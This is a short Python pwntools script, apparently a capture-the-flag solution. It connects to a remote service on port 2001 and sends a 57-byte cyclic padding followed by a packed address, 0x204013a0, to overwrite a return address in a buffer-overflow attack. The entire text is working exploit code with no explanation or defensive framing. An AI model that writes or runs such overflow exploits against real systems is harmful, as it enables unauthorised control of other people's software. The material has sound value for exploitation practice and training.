# Python 3
from pwn import *

io = remote('ip address', 2001)

starting = io.recvuntil(': ')
io.sendline(cyclic(57) + p32(0x204013a0))

output = io.recvall()
log.info(output)
